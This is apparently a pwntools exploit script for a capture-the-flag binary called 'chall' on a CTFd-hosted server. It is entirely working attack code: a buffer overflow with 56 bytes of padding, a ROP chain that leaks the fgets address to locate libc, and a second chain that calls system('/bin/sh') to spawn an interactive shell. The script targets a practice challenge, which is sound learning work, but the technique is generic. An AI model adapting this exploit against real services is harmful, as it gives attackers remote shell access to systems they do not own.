#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
exe = context.binary = ELF('./chall')
context.terminal = ["tilix", "--maximize", '-e', 'sh', '-c']
host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30261)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
rop = ROP("./chall")
padding = "A" * 56

io.recvline()

pop_rdi = exe.search(asm('pop rdi; ret')).next()
ret = exe.search(asm('ret')).next()

rop = flat([

    padding,
    p64(pop_rdi),
    p64(exe.got['fgets']),
    p64(ret),
    p64(exe.sym['puts']),
    p64(exe.sym['main'])

])

io.sendline(rop)

leak = u64((io.recvline().strip("\n").ljust(8, "\x00")))
log.info(hex(leak))

libc = ELF('libc6_2.32-0ubuntu3_amd64.so')
libc.address = leak - libc.sym['fgets']

SYSTEM = libc.sym['system']
BINSH = next(libc.search("/bin/sh"))

print(hex(libc.address))

io.recvline()
rop2 = flat([

    padding,
    pop_rdi,
    BINSH,
    SYSTEM

])

io.sendline(rop2)

io.interactive()

